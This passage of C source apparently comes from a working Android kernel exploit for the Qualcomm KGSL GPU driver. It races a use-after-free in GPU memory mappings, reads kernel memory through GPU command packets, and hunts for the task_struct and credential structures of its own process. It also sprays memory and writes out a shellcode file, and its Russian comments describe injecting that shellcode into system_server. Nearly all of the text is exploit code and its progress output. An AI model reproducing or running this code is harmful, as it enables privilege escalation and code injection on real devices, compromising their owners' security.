                split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
                split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);

                cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0x00000000;
                cmd[dw++] = d_lo;
                cmd[dw++] = d_hi;
                cmd[dw++] = s_lo;
                cmd[dw++] = s_hi;
            }

            cmd[dw++] = cp_type7_packet(CP_NOP, 0);

            size_t ib_bytes = (size_t)dw * 4;
            msync(ib_vma, ib_bytes, MS_SYNC);

            struct kgsl_command_object cmd_obj = {
                .gpuaddr = ib_gpu,
                .size = ib_bytes,
                .flags = KGSL_CMDLIST_IB,
                .id = ib_id};

            struct kgsl_gpu_command gpu_cmd = {0};
            gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
            gpu_cmd.cmdsize = sizeof(cmd_obj);
            gpu_cmd.numcmds = 1;
            gpu_cmd.context_id = ctx_id;

            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
            {
                fprintf(stderr, "\n      [!] GPU command failed at VA 0x%lx\n", (unsigned long)current_va);
                break;
            }

            if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
            {
                fprintf(stderr, "\n      [!] GPU timeout at VA 0x%lx\n", (unsigned long)current_va);
                break;
            }

            msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);

            uint32_t *data = (uint32_t *)dst_vma;
            uint8_t *bytes = (uint8_t *)dst_vma;

            // Debug: check for non-zero data
            int has_data = 0;
            for (int i = 0; i < 1024; i++) {
                if (data[i] != 0) {
                    has_data = 1;
                    break;
                }
            }
            if (has_data) {
                analyze_uaf_page(bytes, current_va);
                usleep(500); // Small pause to reduce system pressure
            }

            pages_scanned++;
            if (pages_scanned % SCAN_PROGRESS_EVERY == 0)
            {
                fprintf(stderr, ".");
                fflush(stderr);
                usleep(500); // Small pause after block scan
            }

            pid_t comm_pid = -1;
            if (find_marker_in_page(bytes, 4096, current_va, &comm_pid))
            {
                // Verify this is a task_struct and not spray_heap
                int kptrs = analyze_uaf_page(bytes, current_va);
                
                // If marker is found, verify PID at OFFSET_PID
                int pid_match = 0;
                for (int i = 0; i < 4096 - 4; i++) {
                    if (*(int*)(bytes + i) == comm_pid) {
                        // Potential OFFSET_PID
                        pid_match = 1;
                        break;
                    }
                }

                if (kptrs < 5 && !pid_match) {
                    fprintf(stderr, "\n      [?] Found marker but K-PTRs=%d and no PID match. Likely spray_heap, skipping...\n", kptrs);
                    current_va += PAGE_SIZE * SCAN_PAGE_STEP;
                    continue;
                }

                fprintf(stderr,
                        "\n      [!!!] FOUND KETO0422 at VA 0x%lx\n",
                        (unsigned long)current_va);
                fprintf(stderr, "      [!!!] PARSED PID: %d\n", comm_pid);
                marker_found = 1;

                if (comm_pid > 0)
                {
                    *(uint64_t *)&gbuf[GBUF_TARGET_PID] = comm_pid;
                    *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;

                    fprintf(stderr, "      [!!!] TARGET PID: %d (saved to gbuf[0x40])\n", comm_pid);
                    fprintf(stderr, "      [!!!] TASK VA: 0x%lx (saved to gbuf[0xb08])\n", (unsigned long)current_va);

                    // Aggressive CRED search in Parent immediately
                    uint8_t *big_data = malloc(8192);
                    uint64_t r_base = (current_va & ~0xFFFULL) - 4096;
                    if (gpu_read_task_struct(fd, r_base, big_data, 4096) == 0 &&
                        gpu_read_task_struct(fd, r_base + 4096, big_data + 4096, 4096) == 0)
                    {
                        int c_off = -1;
                        for (int i = 0; i < 8192 - 8; i++) {
                            if (memcmp(big_data + i, MARKER_NAME, 8) == 0) {
                                c_off = i;
                                break;
                            }
                        }
                        if (c_off != -1) {
                            uint64_t c_ptr = 0, rc_ptr = 0;
                            uid_t my_uid = getuid();
                            fprintf(stderr, "      [*] Parent searching for cred_ptr near c_off 0x%x (UID %d)...\n", c_off, my_uid);
                            int p_cand = 0;
                            for (int off = c_off - 1024; off < c_off + 256; off += 8) {
                                if (off < 0 || off > 8192 - 8) continue;
                                uint64_t p = *(uint64_t *)(big_data + off);
                                if ((p & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                                    p_cand++;
                                    uint8_t cc[64];
                                    if (gpu_read_task_struct(fd, p, cc, 64) == 0) {
                                        uint32_t usage = *(uint32_t *)cc;
                                        uint32_t uid = *(uint32_t *)(cc + 4);
                                        uint32_t gid = *(uint32_t *)(cc + 8);
                                        
                                        if (p_cand < 100) { // More verbose parent search
                                            fprintf(stderr, "      [P] Candidate off 0x%x: ptr=0x%lx, uid=%u, usage=%u\n", 
                                                    off, (unsigned long)p, uid, usage);
                                        }

                                        if (uid == my_uid && usage > 0 && usage < 10000) {
                                            c_ptr = p;
                                            rc_ptr = p;
                                            fprintf(stderr, "      [P] [!!!] Parent found MATCHING CRED! ptr=0x%lx\n", (unsigned long)c_ptr);
                                            break;
                                        }
                                    }
                                }
                            }
                            if (c_ptr) {
                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = c_ptr;
                                *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR] = rc_ptr;
                                fprintf(stderr, "      [!!!] Parent saved cred_ptr to gbuf\n");
                            } else {
                                fprintf(stderr, "      [P] Parent checked %d candidates, no match.\n", p_cand);
                            }
                        }
                    }
                    free(big_data);

                    for (int si = 0; si < spray_count; si++)
                    {
                        if (spray_ctrl[si].pid == comm_pid)
                        {
                            spray_ctrl[si].do_action = 1;
                            fprintf(stderr, "      [!!!] MARKED spray slot %d for PID %d\n", si, comm_pid);
                            break;
                        }
                    }

                    ensure_pid_in_spray_ctrl(comm_pid);

                    // Try to find kernel base from the task data (4096 bytes = 512 uint64_t)
                    for (int i = 0; i < 512; i++)
                    {
                        uint64_t ptr = ((uint64_t *)data)[i];
                        if ((ptr & 0xFFFFFFC000000000ULL) == 0xFFFFFFC000000000ULL)
                        {
                            uint64_t base = ptr & 0xFFFFFFFFFFFF0000ULL;
                            // Search for kernel base by mask
                            for (int j = 0; j < 0x100; j++)
                            {
                                uint64_t candidate = base - (j * 0x10000);
                                if ((candidate & 0xFFFFFFFFFF000000ULL) == 0xffffffc000000000ULL)
                                {
                                    *(uint64_t *)&gbuf[0x20] = candidate;
                                    fprintf(stderr, "[KBASE] Found candidate base 0x%lx via ptr 0x%lx\n", 
                                            (unsigned long)candidate, (unsigned long)ptr);
                                    break;
                                }
                            }
                            if (*(uint64_t *)&gbuf[0x20] != 0) break;
                        }
                    }

                    if (*num_found < MAX_FOUND_PAGES)
                    {
                        found_pages[*num_found].va = current_va;
                        memcpy(found_pages[*num_found].data, data, 4096);
                        found_pages[*num_found].non_zero_count = 1;
                        (*num_found)++;
                    }

                    goto cleanup;
                }
            }

            current_va += PAGE_SIZE * SCAN_PAGE_STEP;
        }
    }

    fprintf(stderr, "\n      [*] Scan complete: scanned %d pages, found %d candidates\n",
            pages_scanned, *num_found);
    fflush(stderr);

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);

    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ctx_id)
    {
        struct kgsl_drawctxt_destroy dctx;
        dctx.drawctxt_id = ctx_id;
        ioctl(fd, _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy), &dctx);
    }

    return marker_found;
}

static int mmap_spray_done;
static void mmap_spray(void)
{
    fprintf(stderr, "\n[13] mmap-spraying user VA space\n");
    mmap_spray_done = 0;
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        void *p;
        for (int j = 0; j < 5; j++)
        {
            p = mmap(addr + PAGE_SIZE * (uint64_t)sig_num[j], PAGE_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
            *(volatile uint8_t *)p = sig_num[j];
            if ((uint64_t)p != (uint64_t)addr + PAGE_SIZE * (uint64_t)sig_num[j])
            {
                fprintf(stderr, "[13] mmap_spray: failed at %p\n", p);
                break;
            }
        }
        mmap_spray_done++;
        if (i % 1000 == 0)
        {
            fprintf(stderr, "[13] Progress: %d/%d\n", i, MMAP_SPRAY_COUNT);
        }
    }
    fprintf(stderr, "[13] mmap-spray complete: %d pages\n", MMAP_SPRAY_COUNT);
}

static void mmap_spray_free(void)
{
    fprintf(stderr, "[CLEANUP] Freeing mmap spray...\n");
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        for (int j = 0; j < 5; j++)
        {
            munmap(addr + PAGE_SIZE * (uint64_t)sig_num[j], 0x1000);
        }
    }
    fprintf(stderr, "[CLEANUP] mmap spray freed\n");
}

static void mmap_check(void)
{
    uint64_t *check_addr = (uint64_t *)&gbuf[GBUF_MMAP_CHECK];
    int cnt = 0;
    uint32_t *corrupt_cnt = (uint32_t *)(gbuf + GBUF_MMAP_CORRUPT);
    fprintf(stderr, "\n[14] mmap-checking user VA space\n");
    *corrupt_cnt = 0;

    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        uint8_t *pp = addr + PAGE_SIZE * (uint64_t)sig_num[0];
        if (*(volatile uint8_t *)pp != sig_num[0])
        {
            fprintf(stderr, "[14] PFN corrupted at 0x%lx!\n", (unsigned long)addr);
            gb_target_addr = (uint64_t)addr;

            for (int k = 0; k < 10; k += 2)
            {
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                void *filled = mmap(hole_addr, PAGE_SIZE,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                                    -1, 0);
                if (filled != MAP_FAILED)
                {
                    *(volatile uint8_t *)filled = 0xCC;
                }
            }
            for (int k = 10; k < 16; k += 1)
            {
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                void *filled = mmap(hole_addr, PAGE_SIZE,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                                    -1, 0);
                if (filled != MAP_FAILED)
                {
                    *(volatile uint8_t *)filled = 0xCC;
                }
            }

            void *base = (void *)(addr + 0x10 * PAGE_SIZE);
            size_t len = 0x3e000;
            void *lib = mmap(base, len,
                             PROT_READ | PROT_EXEC,
                             MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
                             fd_lib, 0);

            if (lib == MAP_FAILED)
            {
                fprintf(stderr, "[14] mmap libbase error\n");
                perror("mmap libbase");
                exit(1);
            }
            else
            {
                fprintf(stderr, "[14] success mmap libbase : va: %p\n", lib);
                volatile uint8_t *p = (volatile uint8_t *)lib;
                for (size_t off = 0; off < 0x3e000; off += PAGE_SIZE)
                {
                    volatile uint8_t dummy = p[off];
                    (void)dummy;
                }
                *(uint64_t *)&gbuf[GBUF_LIB_BASE] = (uint64_t)lib;
            }
        }
    }
    fprintf(stderr, "[14] mmap-check complete\n");
}

static void recover_origin(int fd)
{
    uint64_t patched_va[64] = {0};
    uint64_t saved_pte0[64] = {0};
    size_t patched_cnt = 0;
    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);

    fprintf(stderr, "[RECOVER] Starting PTE recovery, count=%u\n", rb_count);

    for (uint32_t i = 0; i < rb_count && patched_cnt < sizeof(patched_va) / sizeof(patched_va[0]); i++)
    {
        patched_va[patched_cnt] = *(uint64_t *)(gbuf + 0xb08 + i * 24);
        saved_pte0[patched_cnt] = *(uint64_t *)(gbuf + GBUF_PTE_SAVE + i * 8);
        patched_cnt++;
    }

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        perror("recover_origin: ctx create");
        return;
    }
    unsigned ctx_id = ctx.drawctxt_id;
    fprintf(stderr, "[RECOVER] Context created: %u\n", ctx_id);

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 2,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        perror("recover_origin: ib alloc");
        return;
    }
    unsigned ib_id = ib_alloc.id;
    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        perror("recover_origin: ib mmap");
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    uint64_t ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        perror("recover_origin: dst alloc");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    unsigned dst_id = dst_alloc.id;
    void *dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        perror("recover_origin: dst mmap");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    struct kgsl_gpuobj_info dst_info = {.id = dst_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &dst_info);
    uint64_t dst_gpu = dst_info.gpuaddr;

    for (size_t i = 0; i < patched_cnt; i++)
    {
        uint64_t base = patched_va[i];
        if (!base)
            continue;
        uint64_t orig_pte0 = saved_pte0[i];
        if (!orig_pte0)
            continue;

        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        int dw = 0;
        uint32_t d_lo, d_hi, s_lo, s_hi;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
        split64(dst_gpu, &d_lo, &d_hi);
        split64(base + 0x8, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        struct kgsl_command_object obj = {
            .gpuaddr = ib_gpu,
            .size = bytes,
            .flags = KGSL_CMDLIST_IB,
            .id = ib_id};

        struct kgsl_gpu_command c = {0};
        c.cmdlist = (uint64_t)(uintptr_t)&obj;
        c.cmdsize = sizeof(obj);
        c.numcmds = 1;
        c.context_id = ctx_id;

        uint64_t pte1 = 0;
        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0)
        {
            continue;
        }
        else
        {
            msync(dst_vma, 8, MS_SYNC | MS_INVALIDATE);
            pte1 = *(uint64_t *)dst_vma;
        }

        memset(ib_vma, 0, ib_alloc.mmapsize);
        dw = 0;
        split64(base + 8, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 & 0xffffffffu);

        split64(base + 12, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 >> 32);
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        obj.size = bytes;
        memset(&c, 0, sizeof(c));
        c.cmdlist = (uint64_t)(uintptr_t)&obj;
        c.cmdsize = sizeof(obj);
        c.numcmds = 1;
        c.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0)
        {
            fprintf(stderr, "[RECOVER] GPU restore failed for VA 0x%lx\n",
                    (unsigned long)base);
        }
        else
        {
            fprintf(stderr, "[RECOVER] [+] restored PTE0 at VA 0x%lx\n",
                    (unsigned long)base);
        }
    }

    munmap(ib_vma, ib_alloc.mmapsize);
    struct kgsl_gpuobj_free fr = {0};
    fr.id = ib_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    munmap(dst_vma, dst_alloc.mmapsize);
    fr.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
}

static void *bogus_racer(void *arg)
{
    race_state_t *rs = (race_state_t *)arg;

    while (!rs->ready)
    {
        __asm__ __volatile__("" ::: "memory");
    }

    rs->bogus_started = 1;
    __sync_synchronize();

    struct kgsl_map_user_mem req = {0};
    req.fd = -1;
    req.gpuaddr = 0;
    req.len = WRAP_SIZE;
    req.offset = 0;
    req.hostptr = BOGUS_START;
    req.memtype = KGSL_USER_MEM_TYPE_ADDR;
    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

    int ret = ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    int err = errno;

    rs->result = ret;
    rs->saved_errno = err;
    __sync_synchronize();

    return NULL;
}

int main(int argc, char **argv)
{
    struct rlimit rl;
    rl.rlim_cur = rl.rlim_max = 65536;
    setrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = rl.rlim_max = 65536;
    setrlimit(RLIMIT_NPROC, &rl);
    rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_MEMLOCK, &rl);

    gbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (gbuf == MAP_FAILED)
    {
        perror("mmap");
        exit(1);
    }
    fprintf(stderr, "main pid = %d, main ppid=%d\n", getpid(), getppid());
    gbuf[0x888] = 0;

    int pid = fork();
    if (!pid)
    {
        fprintf(stderr, "[CHILD1] Started\n");
        int pid2 = fork();
        if (!pid2)
        {
            if (!wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x12, WAIT_TIMEOUT_MS))
            {
                fprintf(stderr, "[!] child2 timeout waiting for FOUND_PID=0x12\n");
                return 1;
            }
            sleep(2);
            gbuf[GBUF_CALL_LOGLINE] = 0x11;
            fprintf(stderr, "[CHILD2] pid = %d, ppid=%d\n", getpid(), getppid());
            return 0;
        }
        else
        {
            if (!wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x11, WAIT_TIMEOUT_MS))
            {
                fprintf(stderr, "[!] child1 timeout waiting for FOUND_PID=0x11\n");
                _exit(1);
            }
            fprintf(stderr, "[CHILD1] pid = %d, ppid=%d\n", getpid(), getppid());
            gbuf[GBUF_FOUND_PID] = 0x12;
            waitpid(pid2, NULL, 0);
            _exit(0);
        }
    }

    fd_shellcode = open("./shellcode", O_RDWR | O_CREAT | O_TRUNC, 0777);
    write(fd_shellcode, shellcode, shellcode_len);

    char *path = "/system/lib64/libbase.so";
    fd_lib = open(path, O_RDONLY);
    if (fd_lib < 0)
        perror("open");

    if (fstat(fd_lib, &st) < 0)
    {
        close(fd_lib);
        return 0;
    }

    spray_ctrl = mmap(NULL,
                      sizeof(spray_slot_t) * SPRAY_COUNT_MAX,
                      PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS,
                      -1, 0);
    if (spray_ctrl == MAP_FAILED)
    {
        perror("mmap spray_ctrl");
        exit(1);
    }
    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
// Принудительная очистка памяти перед запуском
system("sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null");
sleep(1);

// Находим PID system_server
DIR *dir = opendir("/proc");
if (!dir) {
    perror("opendir /proc");
    exit(1);
}
struct dirent *entry;
pid_t system_server_pid = 0;

while ((entry = readdir(dir)) != NULL) {
    if (entry->d_type != DT_DIR) continue;
    int pid = atoi(entry->d_name);
    if (pid <= 0) continue;
    
    char cmdline_path[64];
    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
    FILE *f = fopen(cmdline_path, "r");
    if (f) {
        char cmdline[256] = {0};
        fread(cmdline, 1, sizeof(cmdline)-1, f);
        fclose(f);
        if (strstr(cmdline, "system_server") != NULL) {
            system_server_pid = pid;
            fprintf(stderr, "[+] Found system_server PID: %d\n", system_server_pid);
            break;
        }
    }
}
closedir(dir);

// Используй UAF для записи shellcode в память system_server
// (аналогично твоему текущему методу)

restart:;
    unsigned int uaf_id = 0, overlap_id = 0, ph_id = 0;
    uint64_t uaf_mmapsize = 0, overlap_mmapsize = 0, ph_mmapsize = 0;
    void *uaf_vma = NULL, *bogus_vma = NULL, *ph_vma = NULL, *overlap_vma = NULL;
    int success = 0;
    int retries = 20;

    fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0)
    {
        perror("open /dev/kgsl-3d0");
        return 1;
    }

    fprintf(stderr, "[1] UAF GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc uaf_alloc = {0};
    uaf_alloc.size = UAF_SIZE;
    uaf_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    uaf_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &uaf_alloc) < 0)
    {
        fprintf(stderr, "[!] UAF alloc failed: %s\n", strerror(errno));
        return 1;
    }
    uaf_id = uaf_alloc.id;
    uaf_mmapsize = uaf_alloc.mmapsize;
    g_uaf_id = uaf_id;
    g_uaf_mmapsize = uaf_mmapsize;
    fprintf(stderr, "    UAF id=%u mmapsize=0x%lx\n", uaf_id,
            (unsigned long)uaf_mmapsize);

    fprintf(stderr, "\n[2] OVERLAP GPUOBJ_ALLOC (no mmap yet)\n");
    struct kgsl_gpuobj_alloc overlap_alloc = {0};
    overlap_alloc.size = OVERLAP_SIZE;
    overlap_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    overlap_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap_alloc) < 0)
    {
        fprintf(stderr, "[!] OVERLAP alloc failed: %s\n", strerror(errno));
        return 1;
    }
    overlap_id = overlap_alloc.id;
    overlap_mmapsize = overlap_alloc.mmapsize;
    fprintf(stderr, "    OVERLAP id=%u mmapsize=0x%lx\n", overlap_id,
            (unsigned long)overlap_mmapsize);

    fprintf(stderr, "\n[3] UAF mmap() at FIXED 0x%lx\n",
            (unsigned long)UAF_START);
    uaf_vma = mmap_gpuobj_fixed(fd, uaf_id, uaf_mmapsize, (void *)(uintptr_t)UAF_START);
    if (uaf_vma == MAP_FAILED || (uint64_t)uaf_vma != UAF_START)
    {
        fprintf(stderr, "[!] UAF mmap failed: %s\n", strerror(errno));
        return 1;
    }
    g_uaf_mmap_ptr = uaf_vma;
    fprintf(stderr, "    UAF mapped at %p (expected 0x%lx)\n",
            uaf_vma, (unsigned long)UAF_START);

    for (size_t i = 0; i < uaf_mmapsize; i += PAGE_SIZE)
    {
        ((volatile char *)uaf_vma)[i] = 1;
    }
    fprintf(stderr, "    Touched %llu pages\n",
            (unsigned long long)(uaf_mmapsize / PAGE_SIZE));

    fprintf(stderr, "\n[4] UAF munmap()\n");
    fprintf(stderr, "    Note: rbtree entry and IOMMU PTEs remain\n");
    munmap(uaf_vma, uaf_mmapsize);
    uaf_vma = NULL;
    g_uaf_mmap_ptr = NULL;
    usleep(200);

    fprintf(stderr, "\n[5] Anonymous mmap at 0x%lx (3 pages)\n",
            (unsigned long)BOGUS_START);
    bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
    if (bogus_vma == MAP_FAILED || (uint64_t)bogus_vma != BOGUS_START)
    {
        fprintf(stderr, "[!] BOGUS mmap failed: %s\n", strerror(errno));
        return 1;
    }
    for (int i = 0; i < 3; i++)
    {
        ((volatile char *)bogus_vma)[i * PAGE_SIZE] = 1;
    }
    fprintf(stderr, "    BOGUS VMA at %p\n", bogus_vma);

    fprintf(stderr, "\n[6] PLACEHOLDER GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc ph_alloc = {0};
    ph_alloc.size = PLACEH_SIZE;
    ph_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    ph_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ph_alloc) < 0)
    {
        fprintf(stderr, "[!] PLACEHOLDER alloc failed: %s\n", strerror(errno));
        return 1;
    }
    ph_id = ph_alloc.id;
    ph_mmapsize = ph_alloc.mmapsize;
    fprintf(stderr, "    PLACEHOLDER id=%u mmapsize=0x%lx\n", ph_id,
            (unsigned long)ph_mmapsize);

    fprintf(stderr, "\n[7] PLACEHOLDER mmap() at FIXED 0x%lx\n",
            (unsigned long)PLACEH_START);
    ph_vma = mmap_gpuobj_fixed(fd, ph_id, ph_mmapsize, (void *)(uintptr_t)PLACEH_START);
    if (ph_vma == MAP_FAILED || (uint64_t)ph_vma != PLACEH_START)
    {
        fprintf(stderr, "[!] PLACEHOLDER mmap failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "    PLACEHOLDER mapped at %p (expected 0x%lx)\n",
            ph_vma, (unsigned long)PLACEH_START);

    for (size_t i = 0; i < ph_mmapsize; i += (PAGE_SIZE * 1024))
    {
        ((volatile char *)ph_vma)[i] = 1;
    }

    int mmap_errno = 0;

    fprintf(stderr, "[8] Main thread will mmap OVERLAP\n\n");

    race_state_t rs = {
        .fd = fd,
        .ready = 0,
        .bogus_started = 0,
        .result = -1,
        .saved_errno = 0};

    pthread_t bogus_thread;
    pthread_create(&bogus_thread, NULL, bogus_racer, &rs);

    rs.ready = 1;
    __sync_synchronize();

    int timeout = 0;
    while (!rs.bogus_started && timeout < 1000)
    {
        __asm__ __volatile__("" ::: "memory");
        timeout++;
    }

    usleep(200);

    fprintf(stderr, "[9] OVERLAP mmap() at FIXED 0x%lx during race\n",
            (unsigned long)OVERLAP_START);

    overlap_vma = mmap_gpuobj_fixed(fd, overlap_id, overlap_mmapsize, (void *)(uintptr_t)OVERLAP_START);
    mmap_errno = errno;

    pthread_join(bogus_thread, NULL);

    fprintf(stderr, "    OVERLAP mmap result: %s\n",
            overlap_vma == MAP_FAILED ? "FAILED" : "SUCCESS");

    if (overlap_vma == MAP_FAILED)
    {
        fprintf(stderr, "      errno=%d (%s)\n", mmap_errno, strerror(mmap_errno));
    }
    else
    {
        fprintf(stderr, "      mapped at %p (expected 0x%lx)\n",
                overlap_vma, (unsigned long)OVERLAP_START);
    }

    if (overlap_vma == MAP_FAILED && mmap_errno == 19)
    {
        fprintf(stderr, "\n[!] RACE CONDITION WON!\n");
        success = 1;
    }

    if (!success)
    {
        fprintf(stderr, "[-] Race failed (errno=%d), retrying...\n", mmap_errno);
        if (!check_memory_available())
        {
            fprintf(stderr, "[MEM] Not enough memory, waiting 2s and retrying...\n");
            sleep(2);
        }

        if (overlap_vma != MAP_FAILED && overlap_vma != NULL)
        {
            munmap(overlap_vma, overlap_mmapsize);
        }
        if (ph_vma != MAP_FAILED && ph_vma != NULL)
        {
            munmap(ph_vma, ph_mmapsize);
        }
        if (bogus_vma != MAP_FAILED && bogus_vma != NULL)
        {
            munmap(bogus_vma, PAGE_SIZE * 3);
        }

        struct kgsl_gpuobj_free free_obj;
        free_obj.flags = 0;
        if (overlap_id)
        {
            free_obj.id = overlap_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (ph_id)
        {
            free_obj.id = ph_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (uaf_id)
        {
            free_obj.id = uaf_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (fd >= 0)
        {
            close(fd);
            fd = -1;
        }

        retries--;
        if (retries > 0)
        {
            fprintf(stderr, "[-] Retrying exploit... (%d attempts left)\n", retries);
            sleep(1);
            goto restart;
        }
        else
        {
            fprintf(stderr, "[!] All retries failed. Giving up.\n");
            return 1;
        }
    }

